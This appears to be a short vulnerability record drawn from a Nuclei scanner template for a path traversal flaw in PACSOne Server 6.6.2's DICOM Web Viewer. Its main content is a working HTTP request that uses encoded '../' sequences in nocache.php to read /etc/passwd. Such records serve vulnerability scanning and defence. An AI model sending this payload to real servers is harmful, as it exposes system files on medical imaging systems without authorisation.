# Vulnerability: PACSOne Server 6.6.2 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`pacsone-server-lfi.yaml`)

## Description
PACSOne Server 6.6.2 is vulnerable to local file inclusion via its integrated DICOM Web Viewer.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd
```

